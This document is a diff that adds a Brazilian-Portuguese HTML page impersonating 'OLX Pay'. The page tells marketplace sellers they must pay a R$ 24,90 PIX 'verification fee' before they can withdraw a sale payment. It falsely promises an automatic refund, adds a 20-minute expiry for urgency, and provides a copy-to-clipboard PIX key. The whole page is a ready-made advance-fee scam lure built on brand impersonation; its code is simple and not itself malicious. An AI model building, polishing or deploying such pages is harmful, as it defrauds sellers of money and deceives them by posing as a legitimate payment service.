@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificação de Segurança - OLX Pay</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
+      margin: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 30px;
+      background-color: #ffffff;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      border-radius: 12px;
+    }
+    h2 {
+      color: #6600cc;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    p {
+      color: #333;
+      line-height: 1.6;
+    }
+    .info-box {
+      background-color: #f7eaff;
+      border-left: 4px solid #a64dff;
+      padding: 15px 20px;
+      margin: 20px 0;
+      border-radius: 8px;
+    }
+    .info-box p {
+      margin: 8px 0;
+      font-weight: bold;
+      color: #4b0082;
+    }
+    .pix-chave {
+      background-color: #f2e6ff;
+      padding: 12px;
+      border-radius: 6px;
+      font-weight: bold;
+      color: #4b0082;
+      text-align: center;
+      user-select: all;
+      word-break: break-word;
+      margin: 10px 0;
+    }
+    .copy-btn, .paid-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #6600cc;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      text-align: center;
+      border: none;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      cursor: pointer;
+    }
+    .copy-btn:hover, .paid-btn:hover {
+      background-color: #4d0099;
+    }
+    .alerta {
+      color: red;
+      text-align: center;
+      font-weight: bold;
+      margin: 10px 0;
+    }
+    .instrucoes {
+      background-color: #e0f7ff;
+      border-left: 4px solid #0099cc;
+      color: #004466;
+      padding: 15px;
+      border-radius: 6px;
+      text-align: center;
+      font-weight: bold;
+    }
+    .destaque {
+      font-weight: bold;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Verificação de Segurança</h2>
+    <p>Para prosseguir com o saque, é necessário pagar uma <span class="destaque">taxa única de verificação</span>. Essa taxa serve para garantir a <span class="destaque">segurança da transação</span>, evitar fraudes e assegurar que <span class="destaque">não se trata de terceiros se passando pelo verdadeiro titular da conta</span>.</p>
+    <p>O valor da taxa será <span class="destaque">devolvido automaticamente</span> ao pagador junto com o valor da venda após a confirmação do pagamento.</p>
+
+    <div class="info-box">
+      <p>💰 Valor a receber: <span style="color:green;">R$ 738,90</span></p>
+<p>🔒 Taxa de verificação: <span style="color:green;">R$ 24,90</span></p>
+<p>📦 Total após liberação: <span style="color:green;">R$ 763,80</span></p>
+    </div>
+
+    <p><strong>Chave PIX (Copia e Cola):</strong></p>
+    <div class="pix-chave" id="pixChave">00020126330014BR.GOV.BCB.PIX0114chavepix@olx.com520400005303986582BR5915OLX Pagamentos6809SÃO PAULO62070503***6304ABCD</div>
+    <button class="copy-btn" onclick="copiarPix()">Copiar Chave PIX</button>
+    
+    <div class="alerta">⚠️ Atenção: Esta chave expira em 20 minutos!</div>
+
+    <div class="instrucoes">
+      📌 Importante: Após realizar o pagamento, envie o comprovante no <strong>Chat da OLX</strong> para garantir a liberação do valor.
+    </div>
+
+    <div class="instrucoes" style="margin-top: 10px; background-color: #fff0f0; border-left-color: #cc0000; color: #660000;">
+      ❓ Em caso de dúvidas, digite <strong>ajuda</strong> no Chat OLX.
+    </div>
+  </div>
+
+  <script>
+    function copiarPix() {
+      const pixChave = document.getElementById("pixChave").innerText;
+      navigator.clipboard.writeText(pixChave).then(function() {
+        alert("Chave PIX copiada!");
+      }, function() {
+        alert("Erro ao copiar. Copie manualmente.");
+      });
+    }
+  </script>
+</body>
+</html>
